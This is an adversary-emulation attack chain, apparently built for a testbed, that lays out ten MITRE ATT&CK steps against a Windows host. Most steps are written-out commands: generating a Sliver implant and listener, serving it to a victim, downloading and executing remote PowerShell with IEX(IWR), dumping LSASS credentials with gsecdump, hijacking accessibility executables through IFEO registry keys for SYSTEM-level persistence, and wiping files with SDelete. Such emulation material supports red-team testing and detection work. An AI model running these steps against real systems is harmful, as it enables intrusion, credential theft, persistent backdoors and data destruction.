# Chain 079

**Testbed**: `env0` · **Steps**: 10 · **Tactics touched**: Command and Control, Execution, Discovery, Credential Access, Persistence, Privilege Escalation, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1204.002, T1059.001 |
| Discovery | T1018 |
| Credential Access | T1003 |
| Persistence | T1546.008 |
| Privilege Escalation | T1546.008 |
| Impact | T1485 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file | Human |
| 3 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 4 | Discovery | T1018 | Host Availability Check | Sliver Executor |
| 5 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin | Human |
| 6 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 7 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 8 | Credential Access | T1003 | Gsecdump | Powershell Executor |
| 9 | Persistence, Privilege Escalation | T1546.008 | Attaches Command Prompt as a Debugger to a List of Target Processes | Powershell Executor |
| 10 | Impact | T1485 | Windows - Overwrite file with SysInternals SDelete | Powershell Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download and execute malicious payload file

- **UUID**: `simulate-download-execute-file`
- **Source**: Manual
- **Supported platforms**: windows, linux
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:8000 in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed ?file - file ?target - host)`

---

### Step 3 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 4 — Host Availability Check

- **UUID**: `sliver-ping`
- **Source**: Sliver
- **Supported platforms**: windows, linux
- **Tactics**: Discovery
- **MITRE ID(s)**: T1018
- **Technique(s)**: Remote System Discovery

**Description**

The `ping` command tests network connectivity to the target host.

**Execution** (Sliver Executor)

```
ping(session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(remote-system-info-known ?target - host)`

---

### Step 5 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin

- **UUID**: `simulate-execute-lnk-windows-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut whose target is a pre-staged executable **and the shortcut is configured / launched such that the target runs as Administrator** — either the shortcut's Properties → Advanced → "Run as administrator" flag is set, or the victim right-clicks the shortcut and selects "Run as administrator".

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Right-click a shortcut (.lnk) whose target is:
#{EXE_PATH}
then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click).
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 6 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 7 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 8 — Gsecdump

- **UUID**: `art-t1003-gsecdump-lsass`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003
- **Technique(s)**: OS Credential Dumping

**Description**

Dumps active-session credentials from LSASS via gsecdump-v2b5 (TrueSec
legacy tool). Uses Method 3 (fold get_prereq_command from ART): the
action itself stages the binary from web.archive.org with SHA256
verification if not already present, then runs `gsecdump -a`. Precondition
is just a powershell session; no marker predicate for the binary. ART
auto_generated_guid 96345bfc-8ae7-4b6a-80b7-223200f24ef9.

**Execution** (Powershell Executor)

```
if (-not (Test-Path "#{gsecdump_exe}")) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  $parentpath = Split-Path "#{gsecdump_exe}"
  $binpath = "$parentpath\gsecdump-v2b5.exe"
  New-Item -ItemType Directory $parentpath -Force | Out-Null
  IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
  if (Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" "#{gsecdump_bin_hash}") {
    Move-Item $binpath "#{gsecdump_exe}"
  }
}
& "#{gsecdump_exe}" -a
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke the prereq + main command. | — | yes |
| `gsecdump_exe` | Local path on target where gsecdump binary should be staged and run. | C:\\Users\\Public\\gsecdump.exe | yes |
| `gsecdump_url` | Download URL for the gsecdump-v2b5 binary (web archive). | https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe | yes |
| `gsecdump_bin_hash` | Expected SHA256 of the gsecdump-v2b5.exe binary. | 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 9 — Attaches Command Prompt as a Debugger to a List of Target Processes

- **UUID**: `art-t1546_008-ifeo-accessibility-debugger`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence, Privilege Escalation
- **MITRE ID(s)**: T1546.008
- **Technique(s)**: Event Triggered Execution: Accessibility Features

**Description**

Uses Image File Execution Options (IFEO) `Debugger` value to attach
a chosen command (default `cmd.exe`) as the "debugger" for Windows
accessibility executables (osk.exe, sethc.exe, utilman.exe, etc.).
Triggering any of these from the lock screen (Shift-5x, Ease-of-
Access button) then launches the attached command as SYSTEM —
classic pre-authentication persistence + priv-esc. ART
auto_generated_guid 3309f53e-b22b-4eb6-8fd2-a6cf58b355a9.

**Execution** (Powershell Executor)

```
$input_table = "#{parent_list}".Split(",")
$Name = "Debugger"
$Value = "#{attached_process}"
foreach ($item in $input_table) {
  $item = $item.Trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  if (-not (Test-Path $registryPath)) { New-Item -Path $registryPath -Force | Out-Null }
  New-ItemProperty -Path $registryPath -Name $Name -Value $Value -Force | Out-Null
}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to modify IFEO registry keys. | — | yes |
| `parent_list` | Comma-separated accessibility executables to hijack via IFEO Debugger. | osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe | yes |
| `attached_process` | Command hijacked in as the IFEO Debugger for each accessibility exe. | C:\\Windows\\System32\\cmd.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-event ?c - string ?target - host)`

---

### Step 10 — Windows - Overwrite file with SysInternals SDelete

- **UUID**: `art-t1485-sdelete-overwrite`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1485
- **Technique(s)**: Data Destruction

**Description**

Sysinternals SDelete overwrites a file with a random pattern before
deleting it, preventing forensic recovery. Method 3 folds the ART
prereq (download SDelete.zip from Sysinternals, expand, copy sdelete.exe).
ART auto_generated_guid 476419b5-aebf-4366-a131-ae3e8dae5fc2.

**Execution** (Powershell Executor)

```
$sdelete = "#{sdelete_exe}"
if (-not (Test-Path $sdelete)) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  $zipPath = "$env:TEMP\SDelete.zip"
  $extractDir = "$env:TEMP\Sdelete"
  Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile $zipPath
  Expand-Archive $zipPath $extractDir -Force
  New-Item -ItemType Directory (Split-Path $sdelete) -Force | Out-Null
  Copy-Item "$extractDir\sdelete.exe" $sdelete -Force
}
if (-not (Test-Path "#{file_to_delete}")) { New-Item "#{file_to_delete}" -Force | Out-Null }
& $sdelete -accepteula "#{file_to_delete}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke SDelete. | — | yes |
| `sdelete_exe` | Target-side path where sdelete.exe is staged. | C:\\Users\\Public\\sdelete.exe | yes |
| `file_to_delete` | Target-side path to the file that SDelete will overwrite and delete. | C:\\Users\\Public\\wipe-me.txt | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`

**Effects**

- `(file-deleted ?f - file ?target - host)`

---
